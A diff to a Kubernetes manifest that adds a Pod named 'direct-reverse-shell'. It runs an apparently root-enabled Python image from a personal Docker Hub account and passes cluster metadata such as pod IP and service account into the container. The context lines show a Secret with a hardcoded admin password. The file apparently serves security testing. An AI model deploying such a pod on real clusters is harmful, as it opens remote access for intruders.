@@ -19,3 +19,41 @@ type: kubernetes.io/basic-auth
 stringData:
   username: admin
   password: t0p-Secret
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: direct-reverse-shell
+spec:
+  containers:
+  - name: pythonroot-testing2
+    image: docker.io/rednoob/pythonroot:latest
+    env:
+      - name: MODEL_CONTAINER_ID
+        value: dummy_id
+      - name: MODEL_CONTAINER_POD_NAME
+        value: dummy_pod
+      - name: MODELS_STR
+        value: "{{inputs.parameters.modelName}}"
+      - name: MODEL_PATH
+        value: /mnt/models
+      - name: MY_NODE_NAME
+        valueFrom:
+          fieldRef:
+            fieldPath: spec.nodeName
+      - name: MY_POD_NAME
+        valueFrom:
+          fieldRef:
+            fieldPath: metadata.name
+      - name: MY_POD_NAMESPACE
+        valueFrom:
+          fieldRef:
+            fieldPath: metadata.namespace
+      - name: MY_POD_IP
+        valueFrom:
+          fieldRef:
+            fieldPath: status.podIP
+      - name: MY_POD_SERVICE_ACCOUNT
+        valueFrom:
+          fieldRef:
+            fieldPath: spec.serviceAccountName   
